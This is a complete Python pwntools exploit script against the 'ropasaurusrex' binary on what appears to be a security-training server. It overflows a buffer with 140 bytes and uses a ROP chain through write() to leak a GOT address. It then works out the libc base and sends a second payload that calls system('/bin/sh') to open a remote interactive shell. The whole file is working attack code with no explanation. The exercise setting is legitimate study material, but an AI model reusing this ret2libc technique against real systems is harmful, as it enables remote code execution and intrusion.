from pwn import *

#context.terminal = ['tmux','splitw','-h']

#r = process("./ropasaurusrex")
r = remote("bin.training.jinblack.it", 2014)
#gdb.attach(r, gdbscript="""
 #    b *0x0804841c
  #   c
#""")
#input("wait")

LIBC = ELF("./libc-2.27.so")


ptr_write = 0x0804830c
next_fun = 0x0804841d
got = 0x08049614

payload = b"A"*140
payload += p32(ptr_write)
payload += p32(next_fun)
payload += p32(1)
payload += p32(got)
payload += p32(4)
r.send(payload)


leak = u32(r.recv(4))
libc_base = leak - 0xe6d80
LIBC.address = libc_base
binsh = libc_base + 0x17e0cf
#binsh = next(LIBC.search(b"/bin/sh/")) 
system = LIBC.symbols["system"]
print("leak: %#x" % leak)
payload = b"A"*140 + p32(system) + p32(0) + p32(binsh)
r.send(payload)

r.interactive()
